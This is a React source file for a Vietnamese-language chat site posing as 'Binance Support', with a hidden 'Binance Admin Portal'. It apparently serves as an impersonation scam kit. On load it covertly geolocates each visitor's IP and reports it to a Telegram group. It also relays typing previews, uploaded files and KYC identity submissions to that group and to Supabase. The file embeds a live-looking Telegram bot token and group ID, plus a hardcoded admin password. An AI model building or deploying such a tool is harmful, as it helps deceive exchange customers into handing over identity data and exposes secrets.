import React, { useState, useEffect, useRef } from 'react';
import CustomerDashboard from './components/CustomerDashboard';
import AdminDashboard from './components/AdminDashboard';
import { Ticket, Message, SenderType, TicketStatus, CustomerInfo, CustomerProfile, TicketPost, PostComment, DefaultPostConfig } from './types';
import { getTelegramUpdates, sendAdminReplyToTelegram, createTelegramTopic, sendTelegramMessage, sendTelegramMedia, sendSystemSync } from './services/telegramService';
import { initSupabase, fetchTicketsFromSupabase, fetchMessagesFromSupabase, syncTicketToSupabase, syncMessageToSupabase } from './services/supabaseService';

const DEFAULT_SHEET_URL = "";
const DEFAULT_BOT_TOKEN = '8497878219:AAGFgUgoIwr-KW4M4S_bqG_Q8FjscrurQlo';
const DEFAULT_GROUP_ID = '-1003839915686';

const DEFAULT_POST_INIT: DefaultPostConfig = {
    authorName: 'Binance Support',
    subject: 'Hệ thống đã sẵn sàng',
    content: 'Chúng tôi đang trực tuyến. Vui lòng đặt câu hỏi tại đây hoặc chat trực tiếp với nhân viên hỗ trợ.',
    image: ''
};

const safeUpdateURL = (key: string, value: string) => {
    try {
        const url = new URL(window.location.href);
        url.searchParams.set(key, value);
        window.history.replaceState({}, '', url.toString());
    } catch (e) {
        console.warn("Environment restricts URL manipulation. Using LocalStorage fallback.");
    }
};

const App = () => {
  const [viewMode, setViewMode] = useState<'customer' | 'admin'>('customer');
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [authPassword, setAuthPassword] = useState('');
  
  const [activeTicketId, setActiveTicketId] = useState<string | null>(null);
  const [isDarkMode] = useState(false); 
  const [isCustomerChatOpen, setIsCustomerChatOpen] = useState(false);

  const ticketsRef = useRef<Ticket[]>([]);
  const activeTicketIdRef = useRef<string | null>(activeTicketId);

  const [config, setConfig] = useState({ 
    botToken: localStorage.getItem('telegram_bot_token') || DEFAULT_BOT_TOKEN, 
    groupId: localStorage.getItem('telegram_group_id') || DEFAULT_GROUP_ID,
    sheetUrl: localStorage.getItem('google_sheet_url') || DEFAULT_SHEET_URL,
    geminiApiKey: localStorage.getItem('gemini_api_key') || '',
    telegramUserId: localStorage.getItem('telegram_user_id') || '',
    supabaseUrl: localStorage.getItem('supabase_url') || '',
    supabaseKey: localStorage.getItem('supabase_key') || ''
  });

  const [defaultPost, setDefaultPost] = useState<DefaultPostConfig>(() => {
      try {
          const saved = localStorage.getItem('default_post_config');
          return saved ? JSON.parse(saved) : DEFAULT_POST_INIT;
      } catch (e) { return DEFAULT_POST_INIT; }
  });
  
  const [tickets, setTickets] = useState<Ticket[]>(() => {
      try {
        const saved = localStorage.getItem('support_tickets');
        if (saved) return JSON.parse(saved);
      } catch (e) {}
      return [];
  });

  const [messages, setMessages] = useState<Message[]>(() => {
      try {
        const saved = localStorage.getItem('support_messages');
        if (saved) return JSON.parse(saved);
      } catch (e) {}
      return [];
  });

  // --- SUPABASE INIT & SYNC ---
  useEffect(() => {
      if (config.supabaseUrl && config.supabaseKey) {
          console.log("Initializing Supabase connection...");
          initSupabase(config.supabaseUrl, config.supabaseKey);
          
          // Load initial data from Cloud
          const loadCloudData = async () => {
              const cloudTickets = await fetchTicketsFromSupabase();
              if (cloudTickets.length > 0) {
                  // Merge strategy: Cloud wins for simplicity in this demo
                  // In real app, we might check timestamps
                  console.log(`Loaded ${cloudTickets.length} tickets from Supabase`);
                  setTickets(prev => {
                       // Keep local tickets that aren't in cloud (yet)
                       const merged = [...cloudTickets];
                       prev.forEach(localT => {
                           if (!merged.find(cloudT => cloudT.id === localT.id)) {
                               merged.push(localT);
                           }
                       });
                       return merged;
                  });

                  // If there is an active ticket, load its messages
                  if (activeTicketId) {
                      const cloudMsgs = await fetchMessagesFromSupabase(activeTicketId);
                      if (cloudMsgs.length > 0) {
                          setMessages(prev => {
                              const merged = [...prev];
                              cloudMsgs.forEach(cm => {
                                  if (!merged.find(m => m.id === cm.id)) merged.push(cm);
                              });
                              return merged.sort((a,b) => new Date(a.timestamp).getTime() - new Date(b.timestamp).getTime());
                          });
                      }
                  }
              }
          };
          loadCloudData();
      }
  }, [config.supabaseUrl, config.supabaseKey, activeTicketId]);


  // --- SHORTCUT ---
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
        if (e.ctrlKey && e.shiftKey && (e.key === 'A' || e.key === 'a')) {
            e.preventDefault();
            setViewMode('admin');
            setIsAuthenticated(false); 
        }
    };
    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, []);

  // --- INIT ---
  useEffect(() => {
      const params = new URLSearchParams(window.location.search);
      const roleParam = params.get('role');
      if (roleParam === 'admin') {
          setViewMode('admin');
      } else {
          setViewMode('customer');
          setTimeout(() => initializeCustomerFlow(), 500);
      }
  }, []);

  const initializeCustomerFlow = async () => {
      const params = new URLSearchParams(window.location.search);
      let currentCaseId = params.get('caseId') || params.get('caseid');
      
      if (!currentCaseId) currentCaseId = localStorage.getItem('my_current_case_id');
      if (!currentCaseId) {
          currentCaseId = `${Math.floor(100000 + Math.random() * 900000)}`;
          localStorage.setItem('my_current_case_id', currentCaseId);
          safeUpdateURL('caseId', currentCaseId);
      } else {
           safeUpdateURL('caseId', currentCaseId);
      }

      setActiveTicketId(currentCaseId);
      const existingTicket = ticketsRef.current.find(t => t.id === currentCaseId);
      
      let d = { ip: 'Unknown', city: 'Unknown', region: '', country_name: 'Unknown', country_code: '' };
      try {
          const res = await fetch('https://ipapi.co/json/');
          d = await res.json();
      } catch(e) {}
      
      const info: CustomerInfo = {
          ip: d.ip, city: d.city, region: d.region, country: d.country_name, countryCode: d.country_code,
          browser: navigator.userAgent.includes('Chrome') ? 'Chrome' : 'Browser',
          os: navigator.platform, device: "Web Browser"
      };

      let topicId = existingTicket?.telegramTopicId;
      if (!topicId && config.botToken && config.groupId) {
          try {
             topicId = await createTelegramTopic(config, `CaseID${currentCaseId}`);
             if(topicId) {
                 const alertMsg = `🚀 **KHÁCH HÀNG TRUY CẬP**\n\n🆔 **Case ID:** \`${currentCaseId}\`\n🌍 **Vị trí:** ${d.city}, ${d.country_name} (${d.country_code})\n💻 **IP:** \`${d.ip}\``;
                 await sendTelegramMessage(config, topicId, alertMsg, "Hệ Thống");
             }
          } catch(e) {}
      }

      if (!existingTicket) {
          const newTicket: Ticket = {
              id: currentCaseId,
              customerName: 'Khách hàng',
              subject: 'Yêu cầu hỗ trợ',
              posts: [{ 
                  id: '1', authorName: defaultPost.authorName, authorRole: 'admin', 
                  subject: defaultPost.subject, content: defaultPost.content, image: defaultPost.image,
                  timestamp: new Date(), comments: [] 
              }],
              priority: 'medium', status: TicketStatus.OPEN, lastMessage: '', createdAt: new Date(), updatedAt: new Date(), unreadCount: 0,
              customerInfo: info, telegramTopicId: topicId || undefined
          };
          setTickets(prev => [newTicket, ...prev]);
          syncTicketToSupabase(newTicket); // Sync new ticket
      } else {
          // Update Customer Info even if ticket exists (for location tracking)
          setTickets(prev => prev.map(t => {
              if (t.id === currentCaseId) {
                  const updated = { ...t, customerInfo: info, telegramTopicId: topicId || t.telegramTopicId };
                  syncTicketToSupabase(updated); // Sync update
                  return updated;
              }
              return t;
          }));
      }
  };

  useEffect(() => {
    ticketsRef.current = tickets;
    localStorage.setItem('support_tickets', JSON.stringify(tickets));
  }, [tickets]);

  useEffect(() => {
    activeTicketIdRef.current = activeTicketId;
  }, [activeTicketId]);

  useEffect(() => {
    localStorage.setItem('support_messages', JSON.stringify(messages));
  }, [messages]);

  // --- SYNC ENGINE (POLLING) ---
  useEffect(() => {
    let isMounted = true;
    const startPolling = async () => {
      while (isMounted) {
        try {
          if (!config.botToken) { await new Promise(r => setTimeout(r, 5000)); continue; }

          const updates = await getTelegramUpdates(config);
          if (updates && updates.length > 0 && isMounted) {
            
            setMessages(prevMessages => {
                const newMessages = [...prevMessages];
                let hasChanges = false;
                let ticketsToUpdate = [...ticketsRef.current];
                let hasTicketChanges = false;

                updates.forEach(u => {
                    let targetTicket = ticketsToUpdate.find(t => t.telegramTopicId === u.topicId);

                    // --- ADMIN: DISCOVER REMOTE TICKETS ---
                    if (!targetTicket && viewMode === 'admin') {
                         const importedId = `remote-${u.topicId}`;
                         let info: CustomerInfo = { ip: 'Remote', device: 'Telegram', os: 'Unknown', browser: 'Unknown', city: 'Unknown', country: 'Unknown', countryCode: '' };
                         
                         if (u.text && u.text.includes("KHÁCH HÀNG TRUY CẬP")) {
                             const ipMatch = u.text.match(/IP:\s*`([\d\.]+)`/);
                             const idMatch = u.text.match(/Case ID:\s*`(\d+)`/);
                             if (ipMatch) info.ip = ipMatch[1];
                             
                             if (idMatch) {
                                 const realId = idMatch[1];
                                 const existingReal = ticketsToUpdate.find(t => t.id === realId);
                                 if (existingReal) {
                                     targetTicket = existingReal;
                                     if (!existingReal.telegramTopicId) {
                                         existingReal.telegramTopicId = u.topicId;
                                         hasTicketChanges = true;
                                     }
                                 } else {
                                     const newImportedTicket: Ticket = {
                                         id: realId, customerName: `Khách ${realId}`, subject: 'Hội thoại từ Telegram', priority: 'medium', status: TicketStatus.OPEN,
                                         lastMessage: u.text, createdAt: new Date(), updatedAt: u.timestamp, unreadCount: 1, telegramTopicId: u.topicId, posts: [], customerInfo: info
                                     };
                                     ticketsToUpdate.unshift(newImportedTicket);
                                     targetTicket = newImportedTicket;
                                     hasTicketChanges = true;
                                     syncTicketToSupabase(newImportedTicket); // Sync Imported
                                 }
                             }
                         }

                         if (!targetTicket) {
                             const newImportedTicket: Ticket = {
                                 id: importedId, customerName: `Khách ${u.senderName || 'Lạ'}`, subject: 'Hội thoại từ Telegram', priority: 'medium', status: TicketStatus.OPEN,
                                 lastMessage: u.text, createdAt: new Date(), updatedAt: u.timestamp, unreadCount: 1, telegramTopicId: u.topicId, posts: [], customerInfo: info
                             };
                             ticketsToUpdate.unshift(newImportedTicket);
                             targetTicket = newImportedTicket;
                             hasTicketChanges = true;
                             syncTicketToSupabase(newImportedTicket); // Sync Imported
                         }
                    }

                    // --- CLOUD SYNC LOGIC (CUSTOMER RECEIVING UPDATES) ---
                    // Nếu nhận được lệnh ⚡CMD: từ Admin qua Telegram
                    if (targetTicket && (u as any).isCommand && (u as any).commandData) {
                         const cmd = (u as any).commandData;
                         console.log("Received Cloud Sync Command:", cmd);

                         let updatedTicket = { ...targetTicket };

                         if (cmd.type === 'UPDATE_PROFILE') {
                             updatedTicket.profile = { ...(updatedTicket.profile || {}), ...cmd.data } as unknown as CustomerProfile;
                             updatedTicket.customerName = cmd.data.fullName || updatedTicket.customerName;
                             hasTicketChanges = true;
                         } else if (cmd.type === 'APPROVE_KYC') {
                             updatedTicket.profile = { ...(updatedTicket.profile || {}), ...updatedTicket.pendingProfile };
                             updatedTicket.pendingProfile = undefined;
                             updatedTicket.customerName = updatedTicket.profile?.fullName || updatedTicket.customerName;
                             hasTicketChanges = true;
                         } else if (cmd.type === 'REJECT_KYC') {
                             updatedTicket.pendingProfile = undefined;
                             hasTicketChanges = true;
                         }

                         if (hasTicketChanges) {
                             // Update local list reference for next iteration
                             ticketsToUpdate = ticketsToUpdate.map(t => t.id === targetTicket!.id ? updatedTicket : t);
                             syncTicketToSupabase(updatedTicket);
                         }
                         
                         return;
                    }

                    // --- CHAT SYNC ---
                    if (targetTicket && !newMessages.find(m => m.id === u.id.toString())) {
                        const senderType = u.isBot ? SenderType.BOT : SenderType.ADMIN;
                        let finalSender = senderType;
                        
                        if (!u.isBot) finalSender = SenderType.ADMIN;
                        else {
                             if (u.text.startsWith('👤')) finalSender = SenderType.CUSTOMER;
                             else if (u.text.startsWith('🛡️')) finalSender = SenderType.ADMIN;
                             else if (u.text.includes("KHÁCH HÀNG TRUY CẬP")) finalSender = SenderType.BOT;
                             else finalSender = viewMode === 'customer' ? SenderType.ADMIN : SenderType.CUSTOMER;
                        }

                        let displayText = u.text;
                        if (finalSender === SenderType.CUSTOMER) displayText = displayText.replace(/^👤 \*.*:\*\n/, '');
                        else if (finalSender === SenderType.ADMIN) displayText = displayText.replace(/^🛡️ \*.*:\*\n/, '');

                        const newMsg: Message = {
                            id: u.id.toString(), ticketId: targetTicket.id, text: displayText, sender: finalSender, timestamp: u.timestamp, attachment: u.attachment
                        };

                        newMessages.push(newMsg);
                        syncMessageToSupabase(newMsg); // Sync new message

                        hasChanges = true;
                        targetTicket.lastMessage = displayText;
                        targetTicket.updatedAt = u.timestamp;
                        if (targetTicket.id !== activeTicketIdRef.current) targetTicket.unreadCount += 1;
                        if (viewMode === 'customer' && targetTicket.id === activeTicketIdRef.current) setIsCustomerChatOpen(true);
                        hasTicketChanges = true;
                        syncTicketToSupabase(targetTicket); // Sync ticket update (last message)
                    }
                });

                if (hasTicketChanges) setTickets(ticketsToUpdate);
                return hasChanges ? newMessages : prevMessages;
            });
          }
        } catch (e) {
          if (isMounted) await new Promise(r => setTimeout(r, 3000));
        }
      }
    };
    startPolling();
    return () => { isMounted = false; };
  }, [config.botToken, viewMode]);

  // --- HANDLERS (ADMIN ACTIONS NOW SYNC TO CLOUD) ---

  const onUpdateTicket = (id: string, updates: Partial<Ticket>) => {
      setTickets(prev => prev.map(t => {
          if (t.id === id) {
              const updated = { ...t, ...updates };
              syncTicketToSupabase(updated);
              return updated;
          }
          return t;
      }));
  };
  
  // Update Profile: Now sends sync command to Telegram
  const onUpdateProfile = (id: string, p: Partial<CustomerProfile>) => {
      const ticket = ticketsRef.current.find(t => t.id === id);
      // Local & Cloud Update
      setTickets(prev => prev.map(t => {
          if (t.id === id) {
              const updated = { ...t, profile: { ...(t.profile || {}), ...p } as any };
              syncTicketToSupabase(updated);
              return updated;
          }
          return t;
      }));
      
      // Notify Telegram
      if (ticket && ticket.telegramTopicId) {
          sendSystemSync(config, ticket.telegramTopicId, 'UPDATE_PROFILE', p);
      }
  };

  const handleApproveProfile = (ticketId: string) => {
      const ticket = ticketsRef.current.find(t => t.id === ticketId);
      
      setTickets(prev => prev.map(t => {
          if (t.id === ticketId && t.pendingProfile) {
              const updated = { ...t, profile: { ...(t.profile || {}), ...t.pendingProfile } as any, pendingProfile: undefined, customerName: t.profile?.fullName || t.pendingProfile!.fullName || t.customerName };
              syncTicketToSupabase(updated);
              return updated;
          }
          return t;
      }));
      
      if (ticket && ticket.telegramTopicId) {
          sendSystemSync(config, ticket.telegramTopicId, 'APPROVE_KYC', {});
          sendAdminReplyToTelegram(config, ticket.telegramTopicId, "✅ Hồ sơ của bạn đã được phê duyệt.");
      }
  };

  const handleRejectProfile = (ticketId: string) => {
      const ticket = ticketsRef.current.find(t => t.id === ticketId);
      
      setTickets(prev => prev.map(t => {
          if (t.id === ticketId) {
              const updated = { ...t, pendingProfile: undefined };
              syncTicketToSupabase(updated);
              return updated;
          }
          return t;
      }));
      
      if (ticket && ticket.telegramTopicId) {
          sendSystemSync(config, ticket.telegramTopicId, 'REJECT_KYC', {});
          sendAdminReplyToTelegram(config, ticket.telegramTopicId, "❌ Hồ sơ của bạn chưa đạt yêu cầu. Vui lòng kiểm tra lại.");
      }
  };

  // --- BASIC HANDLERS ---
  const handleAdminLogin = () => {
      if (authPassword === '2712') { setIsAuthenticated(true); setAuthPassword(''); } else { alert("Mật khẩu sai"); }
  };
  const handleManualAdminAccess = () => { setViewMode('admin'); setIsAuthenticated(false); };

  const handleSendMessage = async (text: string, file?: File) => {
    if (!activeTicketId) return;
    let attachment = undefined;
    if (file) attachment = { type: (file.type.startsWith('video/') ? 'video' : 'image') as 'image' | 'video', url: URL.createObjectURL(file) };
    const msg: Message = { id: Date.now().toString(), ticketId: activeTicketId, text, sender: SenderType.CUSTOMER, timestamp: new Date(), attachment };
    
    setMessages(prev => [...prev, msg]);
    syncMessageToSupabase(msg); // Cloud Sync

    let ticket = ticketsRef.current.find(t => t.id === activeTicketId);
    let topicId = ticket?.telegramTopicId;
    if (!topicId && ticket) {
        topicId = await createTelegramTopic(config, `CaseID${ticket.id}`);
        if (topicId) {
             const newTickets = ticketsRef.current.map(t => {
                 if (t.id === ticket!.id) {
                     const updated = { ...t, telegramTopicId: topicId };
                     syncTicketToSupabase(updated);
                     return updated;
                 }
                 return t;
             });
             setTickets(newTickets);
        }
    }
    if (topicId) {
        const senderName = ticket?.profile?.fullName || ticket?.customerName || 'Khách hàng';
        if (file) sendTelegramMedia(config, topicId, file, text, senderName);
        else sendTelegramMessage(config, topicId, text, senderName);
    }
  };

  const handleAdminSendMessage = (ticketId: string, text: string, file?: File) => {
    let attachment = undefined;
    if (file) attachment = { type: (file.type.startsWith('video/') ? 'video' : 'image') as 'image' | 'video', url: URL.createObjectURL(file) };
    const msg: Message = { id: Date.now().toString(), ticketId, text, sender: SenderType.ADMIN, timestamp: new Date(), attachment };
    
    setMessages(prev => [...prev, msg]);
    syncMessageToSupabase(msg); // Cloud Sync

    const ticket = ticketsRef.current.find(t => t.id === ticketId);
    if (ticket) {
        const newTickets = ticketsRef.current.map(t => {
            if (t.id === ticketId) {
                const updated = { ...t, adminTyping: false };
                syncTicketToSupabase(updated);
                return updated;
            }
            return t;
        });
        setTickets(newTickets);
        if (ticket.telegramTopicId) sendAdminReplyToTelegram(config, ticket.telegramTopicId, text, file);
    }
  };

  const handleTyping = (text: string) => { if (activeTicketId) onUpdateTicket(activeTicketId, { typingPreview: text }); };
  const handleAdminTyping = (id: string, isTyping: boolean) => setTickets(prev => prev.map(t => t.id === id ? { ...t, adminTyping: isTyping } : t));
  const handleSaveDefaultPost = (c: DefaultPostConfig) => {
      setDefaultPost(c); localStorage.setItem('default_post_config', JSON.stringify(c));
      setTickets(prev => prev.map(t => t.posts.length > 0 ? { ...t, posts: [{...t.posts[0], ...c}, ...t.posts.slice(1)] } : t));
      alert("Đã lưu cấu hình bài viết!");
  };
  const onSaveConfig = (t: string, g: string, s: string, k: string, u: string, sbUrl: string, sbKey: string) => {
      setConfig({ botToken: t, groupId: g, sheetUrl: s, geminiApiKey: k, telegramUserId: u, supabaseUrl: sbUrl, supabaseKey: sbKey });
      localStorage.setItem('telegram_bot_token', t); localStorage.setItem('telegram_group_id', g);
      localStorage.setItem('google_sheet_url', s); localStorage.setItem('gemini_api_key', k);
      localStorage.setItem('telegram_user_id', u);
      localStorage.setItem('supabase_url', sbUrl); localStorage.setItem('supabase_key', sbKey);
      
      if (sbUrl && sbKey) {
          initSupabase(sbUrl, sbKey);
          alert("Đã lưu cấu hình & Kết nối Supabase!");
      } else {
          alert("Đã lưu cấu hình (Chế độ Offline/Local)!");
      }
  };
  const handleAddPost = (ticketId: string, post: Omit<TicketPost, 'id' | 'timestamp' | 'comments'>) => {
      const newPost: TicketPost = { ...post, id: Date.now().toString(), timestamp: new Date(), comments: [] };
      setTickets(prev => prev.map(t => t.id === ticketId ? { ...t, posts: [newPost, ...t.posts] } : t));
  };
  const handleAddComment = (ticketId: string, postId: string, comment: Omit<PostComment, 'id' | 'timestamp'>) => {
      const newComment: PostComment = { ...comment, id: Date.now().toString(), timestamp: new Date() };
      setTickets(prev => prev.map(t => t.id === ticketId ? { ...t, posts: t.posts.map(p => p.id === postId ? { ...p, comments: [...p.comments, newComment] } : p) } : t));
  };
  const onRequestProfileUpdate = (ticketId: string, profile: Partial<CustomerProfile>) => {
      // Customer Requesting Update
      const updatedProfile = profile; 
      setTickets(prev => prev.map(t => {
          if (t.id === ticketId) {
             const updated = { ...t, pendingProfile: updatedProfile };
             syncTicketToSupabase(updated);
             return updated;
          }
          return t;
      }));
  };
  const handleFullCreateTicket = (ticket: Ticket) => {
      setTickets(prev => [ticket, ...prev]);
      syncTicketToSupabase(ticket);
  };

  if (viewMode === 'admin' && !isAuthenticated) {
      return (
          <div className="fixed inset-0 z-[200] flex items-center justify-center bg-[#1E2329] text-white">
              <div className="bg-[#2B3139] p-8 rounded-xl shadow-2xl w-full max-w-md border border-gray-700">
                  <div className="text-center mb-6"><h1 className="text-2xl font-bold text-[#FCD535] mb-2">Binance Admin Portal</h1><p className="text-gray-400 text-sm">Hệ thống quản trị tập trung</p></div>
                  <div className="space-y-4">
                      <div><label className="block text-xs font-bold text-gray-500 uppercase mb-2">Mã bảo mật</label><input type="password" value={authPassword} onChange={e => setAuthPassword(e.target.value)} onKeyDown={e => e.key === 'Enter' && handleAdminLogin()} className="w-full p-4 bg-[#181A20] border border-gray-600 rounded-lg text-white focus:border-[#FCD535] outline-none transition-colors font-mono text-center text-xl tracking-widest" placeholder="••••" autoFocus /></div>
                      <button onClick={handleAdminLogin} className="w-full py-4 bg-[#FCD535] hover:bg-[#F0B90B] font-bold text-black rounded-lg uppercase tracking-wide transition-all active:scale-95">Truy cập hệ thống</button>
                      <button onClick={() => { setViewMode('customer'); safeUpdateURL('role', ''); }} className="w-full py-2 text-gray-500 text-sm hover:text-white">Quay lại trang khách hàng</button>
                  </div>
              </div>
          </div>
      );
  }

  if (viewMode === 'admin' && isAuthenticated) {
      return (
        <AdminDashboard 
            tickets={tickets} messages={messages} onAdminSendMessage={handleAdminSendMessage} 
            currentTicketId={activeTicketId} onSelectTicket={(id) => { setActiveTicketId(id); onUpdateTicket(id, { unreadCount: 0 }); }} 
            onSaveConfig={onSaveConfig} onUpdateProfile={onUpdateProfile} initialConfig={config} 
            isDarkMode={true} onUpdateTicket={onUpdateTicket} onAddPost={handleAddPost} 
            onAddComment={handleAddComment} onCreateTicket={() => {}} onCloseTicket={() => {}}
            onApproveProfile={handleApproveProfile} onRejectProfile={handleRejectProfile}
            onFullCreateTicket={handleFullCreateTicket} defaultPostConfig={defaultPost} onSaveDefaultPost={handleSaveDefaultPost} onAdminTyping={handleAdminTyping}
        />
      );
  }

  return (
    <div className={`h-full ${isDarkMode ? 'dark' : ''}`}>
      <CustomerDashboard 
            tickets={tickets} messages={messages} onCreateTicket={() => {}} 
            onSendMessage={handleSendMessage} onLogout={() => {}} activeTicketId={activeTicketId} 
            onSelectTicket={setActiveTicketId} isDarkMode={isDarkMode} onRequestProfileUpdate={onRequestProfileUpdate} 
            onAddPost={() => {}} onAddComment={handleAddComment} onTyping={handleTyping}
            isChatOpen={isCustomerChatOpen} setIsChatOpen={setIsCustomerChatOpen} onAdminRequest={handleManualAdminAccess}
      />
    </div>
  );
}

export default App;